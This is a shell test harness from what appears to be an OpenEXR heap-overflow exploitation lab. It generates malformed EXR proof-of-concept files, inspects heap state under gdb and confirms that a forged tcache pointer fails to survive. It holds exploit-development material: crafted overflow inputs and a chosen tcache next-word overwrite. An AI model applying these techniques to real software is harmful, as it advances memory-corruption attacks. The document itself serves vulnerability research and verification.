#!/bin/sh
# W191: causal negative. In the U=2N N=1072 geometry a live 0x90 tcache head
# lies at dst+4304, but COPY1's out-of-bounds SOURCE bytes zero the unpacked
# chunk's next-chunk size at dst+2152. Preserving every COPY2 byte except the
# tcache next word still aborts in free(), so no malloc can consume the forged
# tcache entry in this consumer. Author replay, not a witness verdict.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-w191 evidence

if [ ! -x bin-vuln-plain/gen_baseline_deep_mixed ]; then
    echo 'missing pinned generator' >&2; exit 1
fi
bin-vuln-plain/gen_baseline_deep_mixed work-w191/baseline.exr > /dev/null
test "$(sha256sum work-w191/baseline.exr | cut -d' ' -f1)" = \
    9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04

# The unmodified generator must still produce the byte-identical W190 file.
python3 cases/make_poc_mixed.py work-w191/baseline.exr \
    work-w191/poc_n1072_5a.exr 1072 0x5a > /dev/null
test "$(sha256sum work-w191/poc_n1072_5a.exr | cut -d' ' -f1)" = \
    663d02672f973b5d0affd36364185729551157be1928f5c48ad3e7d365b45c16

norm() {
    awk '
        { gsub(/==[0-9]+==/, "==PID==") }
        { gsub(/BuildId: [0-9a-f]+/, "BuildId: ID") }
        { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell\/lab\/openexr2shell-real/, "LAB") }
        { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell/, "SITE") }
        { gsub(/0x[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*/, "ADDR") }
        { print }
    '
}

RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT
gdb -q -batch -ex 'set pagination off' -ex 'set confirm off' \
    -ex 'set disable-randomization on' \
    -ex 'break sort2_4ByteChannels_tiled' \
    -ex 'run -c work-w191/poc_n1072_5a.exr' \
    -x harness/w191-dump2.cmd ./build-vuln-plain/bin/exrcheck > "$RAW" 2>&1 || true
norm < "$RAW" > evidence/w191-dump2.out
g=evidence/w191-dump2.out
grep -q 'WINDOW_HEADS=\[(7, 4304, [0-9][0-9]*)\]' "$g"
grep -q '^NEXT-BEFORE-VAL=ADDR$' "$g"
grep -q 'COPY1 dst-out=+0 len=4288' "$g"
grep -q 'COPY2 dst-out=+4288 len=2144' "$g"
grep -q 'double free or corruption' "$g"
# Bytes 24..31 of the dump (the tcache key) vary between processes; pin only
# the stable 16-byte prefix that holds the adjacent chunk header.
test "$(head -c 16 work-w191/pre-copy2-u2n.bin | sha256sum | cut -d' ' -f1)" = \
    1be9889a41747527c4a4f9934a8a6ad9ed0dcf40e25483d811e164b806f9be1a

gdb -q -batch -ex 'set pagination off' -ex 'set confirm off' \
    -ex 'set disable-randomization on' \
    -ex 'break sort2_4ByteChannels_tiled' \
    -ex 'run -c work-w191/poc_n1072_5a.exr' \
    -x harness/w191-header.cmd ./build-vuln-plain/bin/exrcheck > "$RAW" 2>&1 || true
norm < "$RAW" > evidence/w191-header.out
# Before COPY1: next-chunk size 0x31 at dst+2152; after: zeroed by the
# out-of-bounds source bytes of COPY1, before COPY2 runs at all.
test "$(sha256sum work-w191/hdr-before.bin | cut -d' ' -f1)" = \
    c9536f755e345a275a9a663061bf1571d92dfc55f0dce4f38a7e8826c70936d7
test "$(sha256sum work-w191/hdr-after.bin | cut -d' ' -f1)" = \
    374708fff7719dd5979ec875d56cd2286f6d3cf7ec317a3b25632aab28ec37bb
# COPY2 source: stable 16-byte live prefix, a chosen tcache next word, zeros.
SEG=$(python3 -c "print((bytes.fromhex('00000000000000009100000000000000') + (0x4141414141414141).to_bytes(8, 'little') + bytes(2144-24)).hex())")
python3 cases/make_poc_mixed.py work-w191/baseline.exr \
    work-w191/poc_n1072_preserve.exr 1072 0x5a "$SEG" > /dev/null
test "$(sha256sum work-w191/poc_n1072_preserve.exr | cut -d' ' -f1)" = \
    63f840c31dd5d2a474cfce9807a038881838f3dee52539c3fd064e94df7f7d04

set +e
./build-vuln-plain/bin/exrcheck -c work-w191/poc_n1072_preserve.exr \
    > "$RAW" 2>&1
rc=$?
set -e
norm < "$RAW" > evidence/w191-preserve.out
[ "$rc" -eq 134 ]
grep -q 'double free or corruption (!prev)' evidence/w191-preserve.out
test "$(sha256sum evidence/w191-preserve.out | cut -d' ' -f1)" = \
    e01439b82f00318e95c5f87bab6b5b85e63c4b8690abc32ae5afc7175d7434ce

set +e
./build-vuln-plain/bin/exrcheck -c work-w191/baseline.exr \
    > evidence/w191-valid.out 2>&1
base_rc=$?
./build-fixed-asan/bin/exrcheck -c work-w191/poc_n1072_preserve.exr \
    > evidence/w191-fixed.out 2>&1
fixed_rc=$?
set -e
[ "$base_rc" -eq 0 ]
[ "$fixed_rc" -eq 1 ]
grep -q 'bad' evidence/w191-fixed.out

printf 'RESULT PASS\n'
sha256sum evidence/w191-dump2.out evidence/w191-header.out \
    evidence/w191-preserve.out evidence/w191-valid.out evidence/w191-fixed.out
